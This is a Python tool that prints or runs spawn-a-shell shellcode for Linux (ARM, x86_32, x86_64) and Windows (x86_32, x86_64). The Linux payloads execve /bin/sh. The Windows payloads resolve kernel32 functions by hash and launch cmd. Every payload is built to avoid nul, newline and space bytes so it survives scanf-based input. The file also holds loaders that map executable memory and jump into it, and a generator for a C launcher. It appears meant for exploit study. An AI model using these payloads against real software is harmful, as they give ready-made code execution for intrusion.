#!/usr/bin/env python
# -*- coding:UTF-8 -*-
# Copyright (c) 2015 Nicolas Iooss
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
"""Print or run a shellcode accoring to the OS currently running

Related websites:
* http://shell-storm.org/shellcode/
  Shellcodes database for study cases
* http://www.nologin.org/Downloads/Papers/win32-shellcode.pdf
  Understanding Windows Shellcode
* http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html
  Writing Optimized Windows Shellcode in C
* https://github.com/longld/peda/blob/master/lib/shellcode.py
  gdb-peda shellcodes

Metasploit playloads:
* https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/exec.rb
  Run WinExec() in 32-bit Windows. Used by "msfvenom -p windows/exec cmd=calc"

@author: Nicolas Iooss
@license: MIT
"""
import argparse
import ctypes
import ctypes.util
import platform
import re
import sys


# These shellcodes pass scanf constraints (no \n, \0 nor space)
SHELLCODES = {
    'Linux.arm_l': b'\x01@\x8f\xe2\x14\xff/\xe1hF\x0c8R@\x03K\x03Lm@=\xb4iF\x0b\'\x0b\xdf/bin//sh',
    #   e28f4001            add     r4, pc, #1
    #   e12fff14            bx      r4              # go to thumb mode
    #   4668                mov     r0, sp
    #   380c                subs    r0, #12         # r0 = sp - 12
    #   4052                eors    r2, r2          # r2 = NULL
    #   4b03                ldr     r3, [pc, #12]   # r3 = 0x6e69622f = "/bin"
    #   4c03                ldr     r4, [pc, #12]   # r4 = 0x68732f2f = "//sh"
    #   406d                eors    r5, r5          # r5 = 0
    #   b43d                push    {r0, r2-r5}     # push r5, r4, r3, r2, r0
    #   4669                mov     r1, sp          # r1 = [r0, NULL]
    #   270b                movs    r7, #11         # r7 = __NR_execve
    #   df0b                svc     11              # syscall(r7, r0, r1, r2)
    #   6e69622f            .word   0x6e69622f
    #   68732f2f            .word   0x68732f2f

    'Linux.x86_32': b'1\xd2Rh//shh/bin\x89\xe3RS\x89\xe11\xc0\xb0\x0b\xcd\x80',
    #   31 d2                   xor     %edx,%edx   # edx = 0
    #   52                      push    %edx
    #   68 2f 2f 73 68          push    $0x68732f2f
    #   68 2f 62 69 6e          push    $0x6e69622f
    #   89 e3                   mov     %esp,%ebx   # ebx = "/bin//sh"
    #   52                      push    %edx
    #   53                      push    %ebx
    #   89 e1                   mov     %esp,%ecx   # ecx = [ebx, NULL]
    #   31 c0                   xor     %eax,%eax
    #   b0 0b                   mov     $0xb,%al    # eax = 11 = __NR_execve
    #   cd 80                   int     $0x80       # syscall(eax, ebx, ecx, edx)

    'Linux.x86_64': b'H\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xffH\xf7\xdbST_1\xc0\x99RWT^\xb0;\x0f\x05',
    #   48 bb d1 9d 96 91 d0    movabs  $0xff978cd091969dd1,%rbx
    #   8c 97 ff
    #   48 f7 db                neg     %rbx        # rbx = 0x68732f6e69622f
    #   53                      push    %rbx
    #   54                      push    %rsp
    #   5f                      pop     %rdi        # rdi = "/bin/sh"
    #   31 c0                   xor     %eax,%eax   # eax = 0
    #   99                      cltd                # edx = 0
    #   52                      push    %rdx
    #   57                      push    %rdi
    #   54                      push    %rsp
    #   5e                      pop     %rsi        # rsi = [rdi, NULL]
    #   b0 3b                   mov     $0x3b,%al   # eax = 59 = __NR_execve
    #   0f 05                   syscall             # syscall(eax, rdi, rsi, rdx)

    'Windows.x86_32':
        b'\xfc\xeby`1\xc0d\x8b@0\x8b@\x0c\x8bX\x0c\x89\xde\xad\x89\xc3\x8bp0' +
        b'\xac$\xdf<Ku\xf1\x8bk\x18\x8bE<\x8b\\\x05x\x01\xeb\x83\xeb\x10\x8b' +
        b'K(\x8b{0\x01\xef\xe3#I\x8b4\x8f\x01\xee1\xd21\xc0\xac\x84\xc0t\x15' +
        b'0\xc2\xb0\x08\xd1\xeas\x06\x81\xf2x;\xf6\x82\xfe\xc8u\xf2\xeb\xe7' +
        b'\xcc;T$\x1cu\xd4\x8bs4\x01\xeef\x8b\x04N\x8bs,\x01\xee\x8b\x04\x86' +
        b'\x01\xe8\x89D$\x1caP\xc3\xb8\x01cmd\xc1\xe8\x08P1\xc9\xb1|)\xcc' +
        b'\x89\xe71\xc0\xf3\xaa\x89|$\x04\x8dt$(\xc6\x06D\x89v\xf8\x83\xc6D' +
        b'\x89t$$\xc6D$\x10\x01\xc6D$\x14\x10\xb8$\x05\x1az\xe8I\xff\xff\xff' +
        b'j\xff\xadP\xb8vQ\x94\xd8\xe8;\xff\xff\xff1\xc9Q\xb8\xd5\xa5\xc9B' +
        b'\xeb\xf1',
    #   fc                  cld                         # clear direction flag
    #   eb 79               jmp    0x7c                 # make relative calls negative
    # 0x3:              call_by_hash:   # Call the function in kernel32 identified by hash in eax
    #   60                  pusha                       # push eax, ecx, edx, ebx,
    #   31 c0               xor    %eax,%eax            #   orig_esp, ebp, esi, edi
    #   64 8b 40 30         mov    %fs:0x30(%eax),%eax
    #   8b 40 0c            mov    0xc(%eax),%eax       # eax = PEB->Ldr
    #   8b 58 0c            mov    0xc(%eax),%ebx       # ebx = Ldr->InLoadOrderModuleList.Flink
    # 0x10:                                             # check that the module name
    #   89 de               mov    %ebx,%esi            #   begins with K because
    #   ad                  lods   %ds:(%esi),%eax      #   ntdll might be there.
    #   89 c3               mov    %eax,%ebx            # ebx = ebx->InLoadOrderLinks.Flink
    #   8b 70 30            mov    0x30(%eax),%esi      # esi = ebx->BaseDllName
    #   ac                  lods   %ds:(%esi),%al
    #   24 df               and    $0xdf,%al            # al = toupper(esi[0])
    #   3c 4b               cmp    $0x4b,%al
    #   75 f1               jne    0x10                 # Loop if not 'K'
    #   8b 6b 18            mov    0x18(%ebx),%ebp      # ebp = ebx->DllBase
    #   8b 45 3c            mov    0x3c(%ebp),%eax      # eax = IMAGE_DOS_HEADER->e_lfanew
    #   8b 5c 05 78         mov    0x78(%ebp,%eax,1),%ebx
    #                                       # ebx = MAGE_NT_HEADERS->OptionalHeader
    #                                       #   .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
    #                                       #   .VirtualAddress
    #   01 eb               add    %ebp,%ebx            # ebx = IMAGE_EXPORT_DIRECTORY
    #   83 eb 10            sub    $0x10,%ebx           #   - 0x10 to avoid a 0x20
    #   8b 4b 28            mov    0x28(%ebx),%ecx      # ecx = ebx->NumberOfNames
    #   8b 7b 30            mov    0x30(%ebx),%edi      # edi = ebx->AddressOfNames
    #   01 ef               add    %ebp,%edi
    # 0x36:             _find_function:
    #   e3 23               jecxz  0x5b                 # int3 if function not found
    #   49                  dec    %ecx                 # next function
    #   8b 34 8f            mov    (%edi,%ecx,4),%esi
    #   01 ee               add    %ebp,%esi            # Compute CRC32C:
    #   31 d2               xor    %edx,%edx            #   esi = name
    #   31 c0               xor    %eax,%eax            #   eax = current char/bit index
    # 0x42:                                             #   edx = hash
    #   ac                  lods   %ds:(%esi),%al       #   ebx, ecx, edi, ebp: assigned
    #   84 c0               test   %al,%al
    #   74 15               je     0x5c                 # end of name
    #   30 c2               xor    %al,%dl
    #   b0 08               mov    $0x8,%al             # Repeat for 8 bits
    # 0x4b:
    #   d1 ea               shr    %edx                 # shift edx and save carry
    #   73 06               jae    0x55
    #   81 f2 78 3b f6 82   xor    $0x82f63b78,%edx     # reversed Castagnoli polynomial
    #   fe c8               dec    %al
    #   75 f2               jne    0x4b
    #   eb e7               jmp    0x42
    # 0x5b:             _not_found:
    #   cc                  int3
    # 0x5c:             _hash_finished:
    #   3b 54 24 1c         cmp    0x1c(%esp),%edx      # compare hash with saved eax
    #   75 d4               jne    0x36                 # loop back to _find_function
    #   8b 73 34            mov    0x34(%ebx),%esi      # esi = ebx->AddressOfNameOrdinals
    #   01 ee               add    %ebp,%esi            # by the way, eax = 0
    #   66 8b 04 4e         mov    (%esi,%ecx,2),%ax    # convert ecx to ordinal ax
    #   8b 73 2c            mov    0x2c(%ebx),%esi      # esi = ebx->AddressOfFunctions
    #   01 ee               add    %ebp,%esi
    #   8b 04 86            mov    (%esi,%eax,4),%eax
    #   01 e8               add    %ebp,%eax            # eax = function address
    #   89 44 24 1c         mov    %eax,0x1c(%esp)      # restore all regs but eax
    #   61                  popa
    #   50                  push   %eax                 # jump to function
    #   c3                  ret
    # 0x7c:             start:
    #   b8 01 63 6d 64      mov    $0x646d6301,%eax
    #   c1 e8 08            shr    $0x8,%eax
    #   50                  push   %eax                 # push "cmd"
    #   31 c9               xor    %ecx,%ecx
    #   b1 7c               mov    $0x7c,%cl            # allocate 124 bytes for:
    #   29 cc               sub    %ecx,%esp            #   PROCESS_INFORMATION (16)
    #   89 e7               mov    %esp,%edi            #   STARTUPINFO (68)
    #   31 c0               xor    %eax,%eax            #   10 arguments (40)
    #   f3 aa               rep stos %al,%es:(%edi)     # ZeroMemory, edi = "cmd"
    #   89 7c 24 04         mov    %edi,0x4(%esp)       # args(lpCommandLine) = edi
    #   8d 74 24 28         lea    0x28(%esp),%esi      # esi = &STARTUPINFO
    #   c6 06 44            movb   $0x44,(%esi)         # esi->cbSize = 68
    #   89 76 f8            mov    %esi,-0x8(%esi)      # args(lpStartupInfo) = esi
    #   83 c6 44            add    $0x44,%esi           # esi = &PROCESS_INFORMATION
    #   89 74 24 24         mov    %esi,0x24(%esp)      # args(lpProcessInformation) = esi
    #   c6 44 24 10 01      movb   $0x1,0x10(%esp)      # args(bInheritHandles) = TRUE
    #   c6 44 24 14 10      movb   $0x10,0x14(%esp)     # args(dwCreationFlags) = CREATE_NEW_CONSOLE
    #   b8 24 05 1a 7a      mov    $0x7a1a0524,%eax     # call CreateProcessA
    #   e8 49 ff ff ff      call   0x3
    #   6a ff               push   $0xffffffff          # args(dwMilliseconds) = INFINITE
    #   ad                  lods   %ds:(%esi),%eax
    #   50                  push   %eax                 # args(hHandle) = esi->hProcess
    #   b8 76 51 94 d8      mov    $0xd8945176,%eax     # call WaitForSingleObject
    # 0xc3:
    #   e8 3b ff ff ff      call   0x3
    #   31 c9               xor    %ecx,%ecx
    #   51                  push   %ecx                 # args(uExitCode) = 0
    #   b8 d5 a5 c9 42      mov    $0x42c9a5d5,%eax     # call ExitProcess
    #   eb f1               jmp    0xc3

    'Windows.x86_64':
        b'\xfc\xebdUQRVW1\xc0eH\x8b@`H\x8b@\x18H\x8bp\x10H\xadH\x89\xc6H\xad' +
        b'H\x8bh0\x8bu<\x83\xc6@D\x8bT5HI\x01\xeaI\x83\xea\x10A\x8bJ(A\x8bz0' +
        b'H\x01\xefg\xe3\'\xff\xc9\x8b4\x8fH\x01\xee1\xc01\xd2\xac\x84\xc0t' +
        b'\x170\xc2\xb0\x08\xd1\xeas\x06\x81\xf2x;\xf6\x82\xfe\xc8u\xf2\xeb' +
        b'\xe7\xeb$\xcc9\xdau\xd1A\x8bz4H\x01\xeff\x8b\x04OA\x8br,H\x01\xee' +
        b'\x8b\x04\x86H\x01\xe8_^ZY]\xff\xe0\xb8\x01cmd\xc1\xe8\x08PH\x89' +
        b'\xe2\x83\xe4\xf01\xc9\xb1\xd0H)\xccH\x89\xe71\xc0\xf3\xaaH\x8dt$P' +
        b'\xc6F\xd0\x01\xc6\x06hH\x89t$@H\x83\xc6hH\x89t$H\xc6D$(\x10M1\xc0M' +
        b'1\xc9\xbb$\x05\x1az\xe8*\xff\xff\xffj\xffZH\x8bO\xe8\xbbvQ\x94\xd8' +
        b'\xe8\x19\xff\xff\xff1\xc9\xbb\xd5\xa5\xc9B\xeb\xf2',
    #   fc                  cld                         # clear direction flag
    #   eb 64               jmp    0x67                 # make relative calls negative
    # 0x3:              call_by_hash:   # Call the function in kernel32 identified by hash ebx
    #                                   # parameters: rcx, rdx, r8, r9, stack
    #   55                  push   %rbp                 # Save registers
    #   51                  push   %rcx                 # Please note that r10 is
    #   52                  push   %rdx                 #   modified, which breaks ABI
    #   56                  push   %rsi
    #   57                  push   %rdi
    #   31 c0               xor    %eax,%eax
    #   65 48 8b 40 60      mov    %gs:0x60(%rax),%rax
    #   48 8b 40 18         mov    0x18(%rax),%rax      # rax = PEB->Ldr
    #   48 8b 70 10         mov    0x10(%rax),%rsi      # rsi = Ldr->InLoadOrderModuleList.Flink
    #   48 ad               lods   %ds:(%rsi),%rax      # next module (ntdll)
    #   48 89 c6            mov    %rax,%rsi
    #   48 ad               lods   %ds:(%rsi),%rax      # next module (kernel32)
    #   48 8b 68 30         mov    0x30(%rax),%rbp      # rbp = rax->DllBase
    #   8b 75 3c            mov    0x3c(%rbp),%esi      # esi = IMAGE_DOS_HEADER->e_lfanew
    #   83 c6 40            add    $0x40,%esi           # avoid an offset > 127
    #   44 8b 54 35 48      mov    0x48(%rbp,%rsi,1),%r10d
    #                                       # r10d = MAGE_NT_HEADERS->OptionalHeader
    #                                       #   .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
    #                                       #   .VirtualAddress
    #   49 01 ea            add    %rbp,%r10            # r10 = IMAGE_EXPORT_DIRECTORY
    #   49 83 ea 10         sub    $0x10,%r10           #   - 0x10 to avoid a 0x20
    #   41 8b 4a 28         mov    0x28(%r10),%ecx      # ecx = r10->NumberOfNames
    #   41 8b 7a 30         mov    0x30(%r10),%edi      # edi = r10->AddressOfNames
    #   48 01 ef            add    %rbp,%rdi
    # 0x3f:             _find_function:
    #   67 e3 27            jecxz  0x69                 # int3 if function not found
    #   ff c9               dec    %ecx
    #   8b 34 8f            mov    (%rdi,%rcx,4),%esi   # Compute CRC32C:
    #   48 01 ee            add    %rbp,%rsi            #   rsi = name
    #   31 c0               xor    %eax,%eax            #   rax = current char/bit index
    #   31 d2               xor    %edx,%edx            #   edx = hash
    # 0x4e:                                             #   ebx = hash to be found
    #   ac                  lods   %ds:(%rsi),%al       #   ecx, rdi, rbp, r10: assigned
    #   84 c0               test   %al,%al
    #   74 17               je     0x6a
    #   30 c2               xor    %al,%dl
    #   b0 08               mov    $0x8,%al
    # 0x57:
    #   d1 ea               shr    %edx
    #   73 06               jae    0x61
    #   81 f2 78 3b f6 82   xor    $0x82f63b78,%edx     # reversed Castagnoli polynomial
    # 0x61:
    #   fe c8               dec    %al
    #   75 f2               jne    0x57
    #   eb e7               jmp    0x4e
    # 0x67:                                             # (trampoline to start with
    #   eb 24               jmp    0x8d                 #   1-byte relative offsets)
    # 0x69:             _not_found:
    #   cc                  int3
    # 0x6a:             _hash_finished
    #   39 da               cmp    %ebx,%edx            # compare hashes
    #   75 d1               jne    0x3f                 # loop back to _find_function
    #   41 8b 7a 34         mov    0x34(%r10),%edi      # edi = r10->AddressOfNameOrdinals
    #   48 01 ef            add    %rbp,%rdi
    #   66 8b 04 4f         mov    (%rdi,%rcx,2),%ax    # convert rcx to ordinal ax
    #   41 8b 72 2c         mov    0x2c(%r10),%esi      # esi = r10->AddressOfFunctions
    #   48 01 ee            add    %rbp,%rsi
    #   8b 04 86            mov    (%rsi,%rax,4),%eax
    #   48 01 e8            add    %rbp,%rax            # rax = function address
    #   5f                  pop    %rdi                 # restore saved registers
    #   5e                  pop    %rsi
    #   5a                  pop    %rdx
    #   59                  pop    %rcx
    #   5d                  pop    %rbp
    #   ff e0               jmpq   *%rax                # jump to function
    # 0x8d:             start:
    #   b8 01 63 6d 64      mov    $0x646d6301,%eax
    #   c1 e8 08            shr    $0x8,%eax
    #   50                  push   %rax                 # push "cmd"
    #   48 89 e2            mov    %rsp,%rdx            # args(lpCommandLine) = rsp
    #   83 e4 f0            and    $0xfffffff0,%esp     # align stack on 16 bytes
    #   31 c9               xor    %ecx,%ecx            # ecx = args(lpApplicationName) = 0
    #   b1 d0               mov    $0xd0,%cl            # allocate 208 bytes for:
    #   48 29 cc            sub    %rcx,%rsp            #   PROCESS_INFORMATION (24)
    #   48 89 e7            mov    %rsp,%rdi            #   STARTUPINFO (104)
    #   31 c0               xor    %eax,%eax            #   10 arguments (80)
    #   f3 aa               rep stos %al,%es:(%rdi)     # ZeroMemory
    #   48 8d 74 24 50      lea    0x50(%rsp),%rsi      # rsi = &STARTUPINFO
    #   c6 46 d0 01         movb   $0x1,-0x30(%rsi)     # args(bInheritHandles) = TRUE
    #   c6 06 68            movb   $0x68,(%rsi)         # rsi->cbSize = 104
    #   48 89 74 24 40      mov    %rsi,0x40(%rsp)      # args(lpStartupInfo) = rsi
    #   48 83 c6 68         add    $0x68,%rsi           # rsi = &PROCESS_INFORMATION
    #   48 89 74 24 48      mov    %rsi,0x48(%rsp)      # args(lpProcessInformation) = rsi
    #   c6 44 24 28 10      movb   $0x10,0x28(%rsp)     # args(dwCreationFlags) = CREATE_NEW_CONSOLE
    #   4d 31 c0            xor    %r8,%r8              # args(lpProcessAttributes) = NULL
    #   4d 31 c9            xor    %r9,%r9              # args(lpThreadAttributes) = NULL
    #   bb 24 05 1a 7a      mov    $0x7a1a0524,%ebx     # call CreateProcessA
    #   e8 2a ff ff ff      callq  0x3
    #   6a ff               pushq  $0xffffffffffffffff
    #   5a                  pop    %rdx                 # args(dwMilliseconds) = INFINITE
    #   48 8b 4f e8         mov    -0x18(%rdi),%rcx     # args(hHandle) = hProcess
    #   bb 76 51 94 d8      mov    $0xd8945176,%ebx     # call WaitForSingleObject
    # 0xe5:
    #   e8 19 ff ff ff      callq  0x3
    #   31 c9               xor    %ecx,%ecx            # args(uExitCode) = 0
    #   bb d5 a5 c9 42      mov    $0x42c9a5d5,%ebx     # call ExitProcess
    #   eb f2               jmp    0xe5
}


def check_shellcode_constraints():
    """Check that all shellcodes verify the "scanf" constraints:
    no \r, \n, \0 nor space
    """
    for plat_id, shc in sorted(SHELLCODES.items()):
        print("Checking {} ({} bytes)".format(plat_id, len(shc)))
        if b'\0' in shc:
            sys.stderr.write(
                "Error: shellcode for {} contains nul characters\n"
                .format(plat_id))
            return False
        if b'\r' in shc:
            sys.stderr.write(
                "Error: shellcode for {} contains carriage return characters\n"
                .format(plat_id))
            return False
        if b'\n' in shc:
            sys.stderr.write(
                "Error: shellcode for {} contains newline characters\n"
                .format(plat_id))
            return False
        if b' ' in shc:
            sys.stderr.write(
                "Error: shellcode for {} contains space characters\n"
                .format(plat_id))
            return False
    return True


def normalize_arch(arch):
    """Normalize the name of an architecture"""
    arch = arch.lower()
    if arch == 'arm' or re.match(r'^arm(v[1-9]+)?l$', arch):
        return 'arm_l'
    if re.match(r'^i[3-6]86$', arch) or arch in ('x86', 'x86-32'):
        return 'x86_32'
    if arch in ('amd64', 'x86-64'):
        return 'x86_64'
    return arch


def run_code_linux(shellcode):
    """Run the specified shellcode on Linux"""
    # Find functions in libc
    libc = ctypes.CDLL(ctypes.util.find_library('c'))
    libc.mmap.restype = ctypes.c_void_p
    libc.mprotect.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int]

    # Allocate memory with a RW private anonymous mmap
    # PROT_READ=1, PROT_WRITE=2, PROT_EXEC=4
    mem = libc.mmap(0, len(shellcode), 3, 0x22, -1, 0)
    if int(mem) & 0xffffffff == 0xffffffff:
        libc.perror(b"mmap")
        return 1

    # Copy the shellcode
    ctypes.memmove(mem, shellcode, len(shellcode))

    # Change protection to RX
    if libc.mprotect(mem, len(shellcode), 5) == -1:
        libc.perror(b"mprotect")
        return 1

    # Run!
    return ctypes.CFUNCTYPE(ctypes.c_int)(mem)()


def run_code_windows(shellcode):
    """Run the specified shellcode on Linux"""
    k32 = ctypes.windll.kernel32
    k32.VirtualAlloc.restype = ctypes.c_void_p
    int_p = ctypes.POINTER(ctypes.c_int)
    k32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
                                   int_p]

    # Allocate RW memory of type MEM_COMMIT | MEM_RESERVE (=0x1000|0x2000)
    # PAGE_READWRITE = 4
    mem = k32.VirtualAlloc(0, len(shellcode), 0x3000, 4)
    if not mem:
        sys.stderr.write("VirtualAlloc: {}\n".format(ctypes.FormatError()))
        return 1

    # Copy the shellcode
    ctypes.memmove(mem, shellcode, len(shellcode))

    # Change protection to PAGE_EXECUTE_READ = 0x20
    oldprot = ctypes.c_int()
    if not k32.VirtualProtect(mem, len(shellcode), 0x20, ctypes.byref(oldprot)):
        sys.stderr.write("VirtualProtect: {}\n".format(ctypes.FormatError()))
        return 1

    # Run!
    return ctypes.CFUNCTYPE(ctypes.c_int)(mem)()


def main(argv=None):
    parser = argparse.ArgumentParser(description="Print or run a shellcode")
    parser.add_argument('-b', '--binary', action='store_true',
                        help="print a binary version of the shellcode")
    parser.add_argument('-c', '--c-prgm', action='store_true',
                        help="output a C program which launches the shellcode")
    parser.add_argument('-m', '--machine', type=str,
                        help="machine architecture to use")
    parser.add_argument('-q', '--quiet', action='store_true',
                        help="do not print the shellcode")
    parser.add_argument('-r', '--run', action='store_true',
                        help="run the shellcode")
    parser.add_argument('-x', '--hexa', action='store_true',
                        help="print the shellcode in hexadecimal")
    parser.add_argument('-v', '--verbose', action='store_true',
                        help="be more verbose")
    parser.add_argument('-L', '--linux', action='store_const',
                        dest='platform', const='Linux',
                        help="use Linux platform")
    parser.add_argument('-W', '--windows', action='store_const',
                        dest='platform', const='Windows',
                        help="use Windows platform")

    args = parser.parse_args(argv)

    # Without any argument, check all shellcodes
    if not any(vars(args).values()):
        if not check_shellcode_constraints():
            return 1

    # Find out which shellcode to use
    plat_sys = args.platform or platform.system()
    plat_mach = normalize_arch(args.machine or platform.machine())
    plat_id = '{}.{}'.format(plat_sys, plat_mach)

    shc = SHELLCODES.get(plat_id)

    if shc is None:
        sys.stderr.write("No shellcode found for {}\n".format(plat_id))
        return 1

    if args.verbose:
        print("Platform: {}".format(plat_id))

    # Convert the shellcode to a list of ints
    if sys.version_info >= (3, ):
        shc_ints = [by & 0xff for by in shc]
    else:
        shc_ints = [ord(by) for by in shc]

    # Print the shellcode
    if args.c_prgm:
        print('static __attribute__((__section__(".text"))) '
              '__attribute__((__aligned__(4)))')
        print('unsigned const char shellcode[{}] = {{'.format(len(shc)))
        for idx in range(0, len(shc), 12):
            text_data = ('0x{:02x}'.format(by) for by in shc_ints[idx:idx+12])
            print('    {},'.format(', '.join(text_data)))
        print('};')
        print('')
        print('int main(void)')
        print('{')
        print('    ((void (*)(void))shellcode)();')
        print('    return 0;')
        print('}')
    elif not args.quiet:
        if args.binary:
            if hasattr(sys.stdout, 'buffer'):
                sys.stdout.buffer.write(shc)
            else:
                sys.stdout.write(shc)
        elif args.hexa:
            print(''.join('{:02x}'.format(by) for by in shc_ints))
        else:
            text = repr(shc)
            if text[0] == 'b':
                text = text[1:]
            print(text.strip('"\''))

    # Run the shellcode
    if args.run:
        if plat_sys == 'Linux':
            return run_code_linux(shc)
        elif plat_sys == 'Windows':
            return run_code_windows(shc)
        else:
            sys.stderr.write("System {} not implemented\n".format(plat_sys))
            return 1

    return 0


if __name__ == '__main__':
    if sys.version_info < (2, 7):
        sys.stderr.write("This program cannot be run in Python<2.7 mode.\n")
        sys.exit(0)

    sys.exit(main())
